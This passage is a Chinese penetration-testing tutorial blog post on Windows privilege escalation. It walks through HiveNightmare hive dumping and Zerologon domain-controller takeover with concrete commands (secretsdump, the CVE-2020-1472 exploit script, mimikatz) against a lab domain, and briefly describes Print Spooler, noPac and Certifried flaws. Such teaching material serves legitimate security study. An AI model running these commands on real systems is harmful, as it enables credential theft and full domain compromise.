+<p>下面以Windows 10系统为例对该漏洞的利用过程进行简单演示，</p>
+<p>以标准用户执行以下命令检查是否存在漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>
+
+<p>若输出”BUILTIN\Users:(I)(RX)”，则表示该系统易受攻击</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402100232678.png" alt="image-20230402100232678" style="zoom:80%;" />
+
+<p>将编译好的利用程序<a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/HiveNightmare/">HiveNightmare.exe</a>上传到目标主机。直接运行后即可将SAM、SYSTEM、SECURITY转储到当前目录</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402100339692.png" alt="image-20230402100339692" style="zoom:78%;" />
+
+<p>将三个文件复制到本地，使用<code>Impacket</code>项目中的<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump.py</a>导出SAM文件中的用户哈希值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam SAM-<span class="built_in">date</span> -system SYSTEM-<span class="built_in">date</span> -security SECURITY-<span class="built_in">date</span> LOCAL</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402100432348.png" alt="image-20230402100432348" style="zoom:80%;" />
+
+<p>得到用户的哈希值后，测试人员可以对其进行<strong>暴力破解</strong>，也可以直接使用本地管理员用户进行<strong>哈希传递</strong>，从而获取目标主机的SYSTEM权限。哈希传递的细节将在内网横向移动的章节中进行介绍</p>
+<ul>
+<li><code>Zerologon</code> 域内提权</li>
+</ul>
+<blockquote>
+<p><code>Zerologon</code>(CVE-2020-1472)是<code>Netlogon</code>远程协议的一个特权漏洞的提升, 可以在不提供任何凭据的情况下通过身份验证, 实现域内提权</p>
+</blockquote>
+<blockquote>
+<p>漏洞常见的利用方法就是调用<code>Netlogon</code>中的RPC函数<code>NetrServerPasswordSet2</code>来重置域控制器账户的密码。注意这里重置的是DC机器账户密码，该密码由系统随机生成，密码强度是120个字符，并且会定时更新</p>
+</blockquote>
+<p>域内的机器账户以”机器名+$”来命名，它也是一种域用户, 是不允许登录的, 所以不能直接进行远程登录域控制器。但是域控制器的机器账户在默认下拥有<code>DCSync</code>权限, 因此可以通过<code>DCSync</code>攻击导出域管理员密码的哈希, 从而获取域控权限</p>
+<p>1.重置域控密码</p>
+<p>通过<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">cve-2020-1472-exploit.py</a>，将域控制器的密码重置为空</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py DC-1 10.10.10.11</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402103023083.png" alt="image-20230402103023083" style="zoom:80%;" />
+
+<p>使用secretsdump.py以空密码连接上域控，并导出域管理员的哈希值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py hack-my.com/DC-1\$@10.10.10.11 -just-dc-user &quot;hack-my\administrator&quot; -no-pass</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402103107694.png" alt="image-20230402103107694" style="zoom:70%;" />
+
+<p>对域控制器执行哈希传递攻击，获取域控的SYSTEM权限</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402103212445.png" alt="image-20230402103212445" style="zoom:70%;" />
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919"><code>Mimikatz</code></a>也内置了该漏洞的利用模块</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump:zerologon /target:10.10.10.11 /ntlm /null /account:DC-1$/exploit&quot; exit</span><br><span class="line"># /target,指定域控的地址；/account,指定域控的机器账户</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.恢复域控密码</p>
+<blockquote>
+<p>在攻击结束之后需要及时恢复域控的密码, 否则可能导致域控制器脱域。主要原因是域控<code>NTDS.dit</code>中存储的密码和域控本地注册表中存储的密码不一致</p>
+</blockquote>
+<p>首先在域控制器上执行以下命令，导出注册表:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure>
+
+<p>将导出的注册表复制到本地，使用secretsdump.py导出注册表中的哈希值，箭头所指即重置前机器用户的密码(Hex编码后的)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402104326324.png" alt="image-20230402104326324" style="zoom:75%;" />
+
+<p>然后通过运行CVE-2020-1472中的 restorepassword.py 恢复域控密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 restorepassword.py hack-my.com/DC-1@DC-1 -target-ip 10.10.10.11                                   -hexpass <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402104643204.png" alt="image-20230402104643204" style="zoom:80%;" />
+
+
+
+<ul>
+<li>也可以直接利用<code>Mimikatz</code>进行恢复</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::postzerologon /target:hack-my.com /account:DC-1$</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h6 id="Print-Spooler提权漏洞"><a href="#Print-Spooler提权漏洞" class="headerlink" title="Print Spooler提权漏洞"></a>Print Spooler提权漏洞</h6><ul>
+<li><code>PrintDemon</code></li>
+</ul>
+<blockquote>
+<p><code>Print Spooler</code>是Windows系统, 打印后台处理服务, 用来管理所有本地和网络打印队列, 并控制所有打印工作。该服务在Windows中默认开启</p>
+</blockquote>
+<blockquote>
+<p>在Windows上添加打印机时需要设置打印机的端口。Windows支持多种类型的打印机端口，如LPT1端口、USB端口、网络端口和文件等。如果将端口设置为文件路径，那么打印机会将数据打印到指定文件。在标准用户权限下，如果端口文件路径指向一个受保护的系统目录，由于没有权限，打印作业就会失败。但是，微软为了应对打印过程中可能出现的各种中断或异常的状况，引入了假脱机打印机制，该机制可以使系统在重启后恢复之前未执行完的打印任务。问题就出现在这里，因为重启后的Print Spooler服务程序直接使用了SYSTEM权限来恢复未执行的打印作业，如果此时打印机的端口为文件路径，将在系统上造成任意文件写入</p>
+</blockquote>
+<p>成功利用该漏洞的用户可以通过写入二进制文件实现系统服务提权，也可以通过写入DLL文件进行DLL劫持</p>
+<ul>
+<li><p><code>PrintNightmare</code></p>
+<blockquote>
+<p><code>PrintNightmare</code>是广泛影响Windows系统各版本的严重安全漏洞，发生在Windows Print Spooler服务中，有两种变体，一种导致权限提升(CVE-2021-l675),另一种允许远程代码执行(CVE-2021-34527)</p>
+</blockquote>
+<blockquote>
+<p>标准用户可以通过<code>PrintNightmare</code>漏洞绕过<code>PfcAddPrinterDriver</code>的安全验证，并在打印服务器中安装恶意的驱动程序。若当前所控制的用户在域中，则可以连接到域控制器中的Print Spooler服务并在域控制器中安装恶意的驱动程序，进而接管整个域环境</p>
+</blockquote>
+</li>
+</ul>
+<h6 id="Nopac域内提权"><a href="#Nopac域内提权" class="headerlink" title="Nopac域内提权"></a>Nopac域内提权</h6><p>与Kerberos协议的有关</p>
+<h6 id="Certifried域内提权"><a href="#Certifried域内提权" class="headerlink" title="Certifried域内提权"></a><code>Certifried</code>域内提权</h6><p>Active Directory域权限提升漏洞(CVE-2022-26923)。该漏洞是由于对用户属性的不正确获取，允许低权限用户在安装了<strong>活动目录证书服务</strong>(Active Directory Certificate Services, <strong>AD CS</strong>) 服务器角色的活动目录环境中将权限提升至域管理员</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://micgo.top">micgo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://micgo.top/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(4)/">https://micgo.top/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(4)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用<meta name="referrer" content="no-referrer"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://micgo.top" target="_blank">micgo's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a></div><div class="post_share"><div class="social-share" data-image="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(3)/"><img class="next-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">内网渗透体系建设——端口转发与代理</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">micgo</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/micgo520"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">系统内核漏洞提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">系统服务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">不安全的服务权限</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%84%86%E5%BC%B1%E9%A1%B9"><span class="toc-number">1.2.2.</span> <span class="toc-text">服务注册表脆弱项</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%9D%83%E9%99%90%E5%8F%AF%E6%8E%A7"><span class="toc-number">1.2.3.</span> <span class="toc-text">服务路径权限可控</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%AA%E5%BC%95%E7%94%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="toc-number">1.2.4.</span> <span class="toc-text">未引用的服务路径</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#PowerUp"><span class="toc-number">1.2.5.</span> <span class="toc-text">PowerUp</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MSI%E5%AE%89%E8%A3%85%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">MSI安装策略提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%E6%93%8D%E7%BA%B5"><span class="toc-number">1.4.</span> <span class="toc-text">访问令牌操纵</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%93%8D%E4%BD%9C"><span class="toc-number">1.4.1.</span> <span class="toc-text">常规令牌窃取操作</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.2.</span> <span class="toc-text">Potato家族提权</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Bypass-UAC"><span class="toc-number">1.4.3.</span> <span class="toc-text">Bypass UAC</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%93%8D%E4%BD%9C"><span class="toc-number">1.4.4.</span> <span class="toc-text">用户凭据操作</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Print-Spooler%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.5.</span> <span class="toc-text">Print Spooler提权漏洞</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Nopac%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.6.</span> <span class="toc-text">Nopac域内提权</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Certifried%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.7.</span> <span class="toc-text">Certifried域内提权</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(4)/" title="内网渗透体系建设——权限提升">内网渗透体系建设——权限提升</a><time datetime="2023-04-01T16:00:00.000Z" title="发表于 2023-04-02 00:00:00">2023-04-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(3)/" title="内网渗透体系建设——端口转发与代理">内网渗透体系建设——端口转发与代理</a><time datetime="2023-03-29T16:00:00.000Z" title="发表于 2023-03-30 00:00:00">2023-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透体系建设——内网信息收集">内网渗透体系建设——内网信息收集</a><time datetime="2023-03-27T16:00:00.000Z" title="发表于 2023-03-28 00:00:00">2023-03-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(2)/" title="内网渗透体系建设——基础知识">内网渗透体系建设——基础知识</a><time datetime="2023-03-25T16:00:00.000Z" title="发表于 2023-03-26 00:00:00">2023-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/" title="XXE外部实体注入">XXE外部实体注入</a><time datetime="2023-03-22T16:00:00.000Z" title="发表于 2023-03-23 00:00:00">2023-03-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By micgo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '2t5fYJ95Y61Dyi4xHc3dWgxl-gzGzoHsz',
+      appKey: 'UNfGz5zfJGeNX6LS5OyiymLm',
+      avatar: 'monsterid',
+      serverURLs: 'https://2t5fyj95.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
